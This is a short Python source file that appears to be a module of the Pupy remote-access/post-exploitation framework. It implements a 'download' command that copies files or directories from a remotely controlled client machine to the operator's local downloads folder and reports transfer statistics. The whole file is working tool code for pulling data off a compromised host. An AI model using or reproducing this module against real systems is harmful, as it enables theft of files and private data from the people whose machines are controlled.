# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import download
import os
import os.path
import time

__class_name__="DownloaderScript"

@config(category="manage")
class DownloaderScript(PupyModule):
    """ download a file/directory from a remote system """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='download', description=self.__doc__)
        self.arg_parser.add_argument('remote_file', metavar='<remote_path>')
        self.arg_parser.add_argument('local_file', nargs='?', metavar='<local_path>', completer=path_completer)
    def run(self, args):
        remote_file=self.client.conn.modules['os.path'].expandvars(args.remote_file)
        rep=os.path.join("data","downloads",self.client.short_name())
        if not args.local_file:
            try:
                os.makedirs(rep)
            except Exception:
                pass
            args.local_file=os.path.join(rep, os.path.basename(remote_file.replace("\\",os.sep).replace("/",os.sep).rstrip("/\\")))
        self.info("downloading %s ..."%remote_file)
        start_time=time.time()
        download(self.client.conn, remote_file, args.local_file)
        self.success("file downloaded from remote:%s to local:%s"%(remote_file, args.local_file))
        size=os.path.getsize(args.local_file)
        total_time=round(time.time()-start_time, 2)
        self.info("%s bytes downloaded in: %ss. average %sKB/s"%(size, total_time, round((size/total_time)/10**3, 2)))

